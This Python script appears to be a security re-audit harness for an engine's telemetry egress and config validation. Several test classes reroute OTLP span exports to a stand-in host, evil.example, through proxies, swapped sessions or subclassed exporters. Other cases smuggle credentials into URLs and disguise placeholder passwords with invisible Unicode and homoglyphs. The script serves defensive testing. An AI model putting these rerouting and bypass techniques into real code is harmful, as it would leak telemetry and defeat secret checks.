# Security re-audit probes, platform-config rework 2. Run in the gates image (network_mode: none).
import contextlib, json, os, socket, sys, unicodedata
from unittest import mock
sys.path.insert(0, "/work")
NL = chr(10)
def hdr(t): print(NL + "### " + t)

import requests
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import (SimpleSpanProcessor, BatchSpanProcessor, SpanExporter, SpanExportResult)
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
import opentelemetry.exporter.otlp.common.http as otlp_http
from tests.engine_support import base_env, environ
from engine.config import Settings, ConfigError
from engine.errors import StartupRefused
import engine.startup as st
import engine.telemetry as tel
from engine.telemetry import choose_exporter, verify_provider
import harness_telemetry.tracing as _ht

def reset():
    p = trace.get_tracer_provider()
    with contextlib.suppress(Exception): p.shutdown()
    trace._TRACER_PROVIDER = None; trace._TRACER_PROVIDER_SET_ONCE._done = False
    _ht._tracer = trace.get_tracer("harness_telemetry")

def exporters():
    p = trace.get_tracer_provider()
    out = []
    for sp in getattr(getattr(p, "_active_span_processor", None), "_span_processors", ()):
        ex = getattr(sp, "span_exporter", None) or getattr(getattr(sp, "_batch_processor", None), "_exporter", None)
        out.append((type(ex).__name__, getattr(ex, "_endpoint", None)))
    return out

class Spy:
    def __init__(self): self.hosts = []
    def gai(self, host, *a, **k): self.hosts.append(str(host)); raise OSError("spy")
    def cc(self, addr, *a, **k): self.hosts.append(str(addr[0])); raise OSError("spy")
    def sc(self, sock, addr, *a, **k): self.hosts.append(str(addr[0])); raise OSError("spy")
    @contextlib.contextmanager
    def on(self):
        with mock.patch("socket.getaddrinfo", self.gai), mock.patch("socket.create_connection", self.cc), \
             mock.patch.object(socket.socket, "connect", self.sc), mock.patch.object(socket.socket, "connect_ex", self.sc), \
             mock.patch.object(otlp_http, "_MAX_RETRIES", 1):
            yield self

hdr("0. Exporter structure (where the session lives)")
with environ(base_env(KE_ENV="ci", HARNESS_TRACING="otlp", KE_TELEMETRY__COLLECTOR_ENDPOINT="http://localhost:6006")):
    ex = choose_exporter(Settings())
def dump(o, pre="exporter", d=0):
    if d > 3 or not hasattr(o, "__dict__") or not type(o).__module__.startswith(("opentelemetry", "requests")): return
    for k, v in vars(o).items():
        if isinstance(v, requests.Session) or "endpoint" in k or "session" in k or "transport" in k or "client" in k:
            print("  %s.%s: %s" % (pre, k, repr(v) if isinstance(v, str) else type(v).__name__))
        if isinstance(v, requests.Session): continue
        dump(v, pre + "." + k, d + 1)
dump(ex)
print("  sessions found by engine walk:", [(type(s).__name__, s.trust_env, s.proxies) for s in tel._sessions_of(ex)])

hdr("1. H2 proxy matrix: engine startup + one span + flush; hosts dialled")
P = "http://evil.example:3128"
proxy_envs = [
    ("none", {}),
    ("HTTP_PROXY", {"HTTP_PROXY": P}),
    ("http_proxy", {"http_proxy": P}),
    ("ALL_PROXY", {"ALL_PROXY": P}),
    ("all_proxy", {"all_proxy": P}),
    ("HTTPS_PROXY", {"HTTPS_PROXY": P}),
    ("all upper+lower", {"HTTP_PROXY": P, "http_proxy": P, "ALL_PROXY": P, "HTTPS_PROXY": P, "https_proxy": P}),
    ("HTTP_PROXY + NO_PROXY=localhost,127.0.0.1", {"HTTP_PROXY": P, "NO_PROXY": "localhost,127.0.0.1"}),
    ("http_proxy + no_proxy empty", {"http_proxy": P, "no_proxy": ""}),
    ("HTTP_PROXY + NO_PROXY=*", {"HTTP_PROXY": P, "NO_PROXY": "*"}),
    ("HTTP_PROXY + REQUESTS_CA_BUNDLE/CURL_CA_BUNDLE", {"HTTP_PROXY": P, "REQUESTS_CA_BUNDLE": "/nonexistent", "CURL_CA_BUNDLE": "/nonexistent"}),
]
endpoints = [("phoenix default", None), ("localhost", "http://localhost:6006"), ("127.0.0.1", "http://127.0.0.1:6006"), ("[::1]", "http://[::1]:6006")]
bad = 0
for elabel, ep in endpoints:
    for plabel, penv in proxy_envs:
        ov = dict(KE_ENV="ci", HARNESS_TRACING="otlp", **penv)
        if ep: ov["KE_TELEMETRY__COLLECTOR_ENDPOINT"] = ep
        e = base_env(**ov)
        if not ep:
            e.pop("KE_TELEMETRY__COLLECTOR_ENDPOINT", None); e.pop("PHOENIX_COLLECTOR_ENDPOINT", None)
        spy = Spy()
        with environ(e), spy.on():
            reset()
            try:
                st.startup()
                with trace.get_tracer("probe").start_as_current_span("probe-span"): pass
                trace.get_tracer_provider().force_flush(5000)
                res = "OK"
            except Exception as x: res = "error %s: %s" % (type(x).__name__, x)
            exs = exporters()
        hs = sorted(set(spy.hosts)); bad += "evil.example" in hs
        print("%-16s %-46s %s; exporter=%s; dialled=%s" % (elabel, plabel, res, exs, hs))
reset()
print("cases dialling evil.example:", bad)

hdr("2. H2 installed-provider variants: verify_provider([]) and real dial with HTTP_PROXY set")
def otlp_local(session=None):
    if session is None: return OTLPSpanExporter("http://localhost:6006/v1/traces")
    return OTLPSpanExporter("http://localhost:6006/v1/traces", session=session)
def sess(trust=False, proxies=None, cls=requests.Session):
    s = cls(); s.trust_env = trust
    if proxies: s.proxies.update(proxies)
    return s
class EvilSession(requests.Session):
    def request(self, method, url, *a, **k):
        return super().request(method, "http://evil.example:9/v1/traces", *a, **k)
class CustomTransport:
    """Not a requests.Session at all."""
    def post(self, url, **k): socket.create_connection(("evil.example", 9), 1)
from requests.adapters import HTTPAdapter
class RerouteAdapter(HTTPAdapter):
    def send(self, request, **k):
        request.url = "http://evil.example:9/v1/traces"; return super().send(request, **k)
def find_session_holder(ex):
    for path in (("_session",), ("_client", "_transport", "_session"), ("_client", "_session"), ("_transport", "_session")):
        o = ex
        try:
            for p_ in path[:-1]: o = getattr(o, p_)
            if isinstance(getattr(o, path[-1]), requests.Session): return o, path
        except AttributeError: pass
    raise RuntimeError("session not found")
def variant(label, mk):
    try: ex = mk()
    except Exception as x: print("%-62s build failed: %s %s" % (label, type(x).__name__, x)); return
    spy = Spy(); p = TracerProvider(); p.add_span_processor(SimpleSpanProcessor(ex))
    with mock.patch.object(trace, "get_tracer_provider", lambda: p):
        try: verify_provider([]); v = "ACCEPTED"
        except StartupRefused as x: v = "refused (%s)" % x.setting
    with environ(base_env(KE_ENV="ci", HTTP_PROXY=P)), spy.on():
        with contextlib.suppress(Exception):
            with p.get_tracer("v").start_as_current_span("v-span"): pass
    with contextlib.suppress(Exception): p.shutdown()
    print("%-62s verify=%-34s dialled=%s" % (label, v, sorted(set(spy.hosts))))
variant("engine-built shape (trust_env False)", lambda: otlp_local(sess()))
variant("default session (trust_env True)", lambda: otlp_local())
variant("trust_env False + session.proxies http=evil", lambda: otlp_local(sess(proxies={"http": P})))
variant("trust_env False + session.proxies all=evil", lambda: otlp_local(sess(proxies={"all": P})))
def mounted():
    s = sess(); s.mount("http://", RerouteAdapter()); return otlp_local(s)
variant("trust_env False + mounted rerouting adapter", mounted)
variant("Session subclass (trust_env False) rewriting URL", lambda: otlp_local(sess(cls=EvilSession)))
def replaced_custom():
    ex = otlp_local(sess()); o, path = find_session_holder(ex); setattr(o, path[-1], CustomTransport()); return ex
variant("session replaced by custom non-Session object", replaced_custom)
def replaced_custom_decoy():
    ex = otlp_local(sess()); o, path = find_session_holder(ex); setattr(o, path[-1], CustomTransport()); ex._decoy = sess(); return ex
variant("custom transport + decoy trust_env False Session attr", replaced_custom_decoy)
def replaced_trusting():
    ex = otlp_local(sess()); o, path = find_session_holder(ex); setattr(o, path[-1], sess(trust=True)); return ex
variant("session swapped for trust_env True Session", replaced_trusting)
def trust_flipped_after():
    ex = otlp_local(sess()); o, path = find_session_holder(ex); getattr(o, path[-1]).trust_env = True; return ex
variant("trust_env flipped True after build", trust_flipped_after)
def endpoint_mismatch():
    ex = OTLPSpanExporter("http://evil.example:9/v1/traces", session=sess()); ex._endpoint = "http://localhost:6006/v1/traces"; return ex
variant("built for evil, exporter._endpoint rewritten to localhost", endpoint_mismatch)
class SubOtlp(OTLPSpanExporter):
    def export(self, spans):
        with contextlib.suppress(OSError): socket.create_connection(("evil.example", 9), 1)
        return SpanExportResult.SUCCESS
variant("OTLPSpanExporter subclass overriding export()", lambda: SubOtlp("http://localhost:6006/v1/traces", session=sess()))
class NonRequests(SpanExporter):
    def export(self, spans):
        with contextlib.suppress(OSError): socket.create_connection(("evil.example", 9), 1)
        return SpanExportResult.SUCCESS
    def shutdown(self): pass
variant("non-requests transport exporter (raw socket)", NonRequests)
try:
    from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter as G
    variant("gRPC OTLP exporter localhost", lambda: G("localhost:4317", insecure=True))
except ImportError:
    print("gRPC OTLP exporter: not installed")
reset()

hdr("3. M3/R1 foreign provider installed before startup(): outcome and spans received")
class Foreign(SpanExporter):
    def __init__(self): self.names = []
    def export(self, spans): self.names += [s.name for s in spans]; return SpanExportResult.SUCCESS
    def shutdown(self): pass
class NonSdkProvider(trace.TracerProvider):
    """API-only provider that records every span started on it."""
    def __init__(self):
        self._inner = TracerProvider(); self._mem = InMemorySpanExporter(); self._inner.add_span_processor(SimpleSpanProcessor(self._mem))
    def get_tracer(self, *a, **k): return self._inner.get_tracer(*a, **k)
def sdk_with(proc_factory):
    def mk():
        f = Foreign(); p = TracerProvider(); p.add_span_processor(proc_factory()); p.add_span_processor(SimpleSpanProcessor(f)); return p, (lambda: f.names)
    return mk
def nonsdk():
    p = NonSdkProvider(); return p, (lambda: [s.name for s in p._mem.get_finished_spans()])
class SneakySimple(SimpleSpanProcessor):
    def __init__(self, sink): super().__init__(InMemorySpanExporter()); self.sink = sink
    def on_end(self, span): self.sink.names.append(span.name); super().on_end(span)
def sneaky():
    f = Foreign(); p = TracerProvider(); p.add_span_processor(SneakySimple(f)); return p, (lambda: f.names)
shapes = [
    ("SDK: unknown exporter", sdk_with(lambda: SimpleSpanProcessor(Foreign()))),
    ("SDK: OTLP evil", sdk_with(lambda: BatchSpanProcessor(OTLPSpanExporter("http://evil.example:4318/v1/traces")))),
    ("SDK: OTLP local, trust_env True", sdk_with(lambda: SimpleSpanProcessor(otlp_local()))),
    ("SDK: OTLP local, trust_env False + proxies", sdk_with(lambda: SimpleSpanProcessor(otlp_local(sess(proxies={"http": P}))))),
    ("non-SDK API provider", nonsdk),
    ("SDK: SimpleSpanProcessor subclass on_end sink", sneaky),
]
settings_cases = [
    ("passing ci", dict(KE_ENV="ci")),
    ("passing dev", dict(KE_ENV="dev")),
    ("auth off ci", dict(KE_ENV="ci", KE_AUTH__ENABLED="false")),
    ("placeholder ci", dict(KE_ENV="ci", KE_STORES__POSTGRES__PASSWORD="changeme-x")),
    ("non-local collector", dict(KE_ENV="ci", HARNESS_TRACING="otlp", KE_TELEMETRY__COLLECTOR_ENDPOINT="http://evil.example")),
    ("ConfigError", dict(KE_ENV="ci", KE_API__LISTEN_PORT="notint")),
]
for slabel, ov in settings_cases:
    for plabel, mk in shapes:
        with environ(base_env(**ov)):
            reset(); p, names = mk(); trace.set_tracer_provider(p)
            try: st.startup(); out = "startup OK"
            except (StartupRefused, ConfigError) as x: out = "refused %s %s" % (type(x).__name__, getattr(x, "setting", ""))
            print("%-20s %-46s %-46s spans received=%s" % (slabel, plabel, out, names()))
reset()
with environ(base_env(KE_ENV="ci", KE_STACK__SERVICE_NAMES='["evil.example"]')):
    reset(); f = Foreign(); p = TracerProvider()
    p.add_span_processor(SimpleSpanProcessor(OTLPSpanExporter("http://evil.example:4318/v1/traces", session=sess()))); p.add_span_processor(SimpleSpanProcessor(f)); trace.set_tracer_provider(p)
    try: st.startup(); out = "startup OK"
    except (StartupRefused, ConfigError) as x: out = "refused %s" % type(x).__name__
    print("service_names=[evil.example], installed OTLP evil (trust_env False): %s; spans=%s" % (out, f.names))
reset()
with environ(base_env(KE_ENV="ci", OTEL_PYTHON_TRACER_PROVIDER="sdk_tracer_provider")):
    reset()
    try: st.startup(); out = "startup OK"
    except Exception as x: out = "%s: %s" % (type(x).__name__, x)
    print("OTEL_PYTHON_TRACER_PROVIDER=sdk_tracer_provider: %s; provider=%s exporters=%s" % (out, type(trace.get_tracer_provider()).__name__, exporters()))
reset()
events = []
orig_vp = st.verify_provider; orig_cs = st.chain_span
def vp(*a, **k): events.append("verify_provider"); return orig_vp(*a, **k)
@contextlib.contextmanager
def cs(name, *a, **k):
    events.append("span:" + name)
    with orig_cs(name, *a, **k) as s: yield s
for label, ov in [("passing", dict(KE_ENV="ci")), ("auth off", dict(KE_ENV="ci", KE_AUTH__ENABLED="false")), ("ConfigError", dict(KE_ENV="ci", KE_API__LISTEN_PORT="x"))]:
    events.clear()
    with environ(base_env(**ov)), mock.patch.object(st, "verify_provider", vp), mock.patch.object(st, "chain_span", cs):
        reset()
        with contextlib.suppress(Exception): st.startup()
    print("order %-12s %s" % (label, events))
import inspect
src = "".join(inspect.getsource(sys.modules[m]) for m in ("engine.startup", "engine.config.loader", "engine.config.settings", "engine.egress"))
print("span helpers referenced in startup/config/egress modules:", sorted({n for n in ("chain_span", "llm_span", "tool_span", "retriever_span", "agent_span", "start_as_current_span", "start_span") if n in src}))
reset()

hdr("4. M4 userinfo variants (ConfigError expected unless marked allowed)")
SECRET = "hunter2"
cases = [
    ("u:pw@host", "http://u:%s@allowed.example/v1" % SECRET),
    ("empty password u@host", "http://u@allowed.example/v1"),
    ("empty user :pw@host", "http://:%s@allowed.example/v1" % SECRET),
    ("bare @host", "http://@allowed.example/v1"),
    ("pct-encoded @ in user + real @", "http://u%%40x:%s@allowed.example/v1" % SECRET),
    ("pct-encoded @ only u%40allowed.example", "http://u%40allowed.example/v1"),
    ("pct u%3Apw%40allowed.example", "http://u%3A" + SECRET + "%40allowed.example/v1"),
    ("IPv6 with userinfo", "http://u:%s@[::1]:8080/v1" % SECRET),
    ("IPv6 no userinfo (allowed)", "http://[::1]:8080/v1"),
    ("backslash before @", "http://allowed.example\@evil.example/v1"),
    ("tab inside userinfo", "http://u:hun\tter2@allowed.example/v1"),
    ("newline before @", "http://u:" + SECRET + "\n@allowed.example/v1"),
    ("uppercase scheme", "HTTP://u:%s@allowed.example/v1" % SECRET),
    ("no scheme u:pw@host", "u:%s@allowed.example" % SECRET),
    ("leading space", " http://u:%s@allowed.example/v1" % SECRET),
    ("@ in path (allowed)", "http://allowed.example/v1/@user"),
    ("@ in query (allowed)", "http://allowed.example/v1?who=a@b"),
    ("@ in fragment (allowed)", "http://allowed.example/v1#a@b"),
    ("pw in query (allowed by design)", "http://allowed.example/v1?key=x"),
]
for label, url in cases:
    for key in ("KE_MODELS__COMPOSE__BASE_URL", "KE_MODELS__EMBED__BASE_URL", "KE_MODEL_UPSTREAM"):
        with environ(base_env(KE_ENV="ci", **{key: url})):
            try:
                s = Settings()
                v = s.models.compose.base_url if "COMPOSE" in key else s.models.embed.base_url if "EMBED" in key else s.models.model_upstream
                auth = str(v).split("//", 1)[-1].split("/", 1)[0]
                r = "LOADED -> %r (userinfo in authority=%s)" % (str(v), "@" in auth)
            except ConfigError as x: r = "ConfigError (pw leaked=%s)" % (SECRET in str(x))
            except Exception as x: r = "UNWRAPPED %s" % type(x).__name__
        print("%-40s %-28s %s" % (label, key, r))
# YAML path: config file with userinfo
import tempfile, pathlib
print("loader config-file source:", [n for n in dir(sys.modules["engine.config.loader"]) if "path" in n.lower() or "file" in n.lower() or "yaml" in n.lower()][:10])

hdr("5. L1b placeholder bypass (ci)")
def chk(v):
    with environ(base_env(KE_ENV="ci", KE_STORES__POSTGRES__PASSWORD=v)):
        try: st.check(Settings()); return "STARTS"
        except StartupRefused: return "refused"
        except ConfigError: return "ConfigError"
inv = {"NBSP": " ", "FEFF": "﻿", "2060": "⁠", "200B": "​", "200C": "‌", "200D": "‍", "TAB": "\t",
       "180E": "᠎", "00AD": "­", "2061": "⁡", "2062": "⁢", "2063": "⁣", "2064": "⁤", "034F": "͏",
       "3164": "ㅤ", "115F": "ᅟ", "1160": "ᅠ", "FFA0": "ﾠ", "202E": "‮", "202A": "‪", "2066": "⁦", "2069": "⁩",
       "200E LRM": "‎", "061C ALM": "؜", "E0020 tag": "\U000e0020", "E0001 tag": "\U000e0001", "3000": "　",
       "2028 LS": " ", "2029 PS": " ", "000B VT": "\x0b", "001F": "\x1f", "0085 NEL": "\x85",
       "FE0F VS16": "️", "FE00 VS1": "︀", "E0100 VS17": "\U000e0100", "1D173 musical": "\U0001d173",
       "2800 braille blank": "⠀", "1D159 null notehead": "\U0001d159", "FFFC obj": "￼", "17B4 khmer": "឴", "17B5": "឵",
       "NBSP+FEFF+2060": " ﻿⁠"}
for name, ch in inv.items():
    print("%-22s cat=%-3s before=%-8s inside=%-8s after-c=%s" % (name, unicodedata.category(ch[0]), chk(ch + "changeme-x"), chk("chan" + ch + "geme-x"), chk("c" + ch + "hangeme-x")))
for label, v in [("fullwidth", "ｃｈａｎｇｅｍｅ"), ("math bold", "".join(chr(0x1D41C + ord(c) - 97) for c in "changeme")),
                 ("double-struck C", "ℂhangeme"), ("circled letters", "".join(chr(0x24D0 + ord(c) - 97) for c in "changeme")),
                 ("UPPER", "CHANGEME-x"), ("superscript h U+02B0", "cʰangeme"),
                 ("combining acute on a (U+0301)", "chángeme"), ("combining acute on c", "ćhangeme"),
                 ("combining long stroke U+0336 on c", "c̶hangeme"), ("combining grave after final e", "changemè"),
                 ("combining acute on m", "changeḿe"),
                 ("ligature U+FB00 prefix (control)", "ﬀchangeme"), ("ligature U+FB06 st (NFKC) inside", "changﬆeme"),
                 ("Cyrillic с homoglyph", "сhangeme"), ("Cyrillic а,е homoglyphs", "chаngеmе"),
                 ("Latin alpha U+0251", "chɑngeme"),
                 ("real secret", "Xk9-real-value"), ("single space", " "), ("x", "x")]:
    print("%-40s %s" % (label, chk(v)))
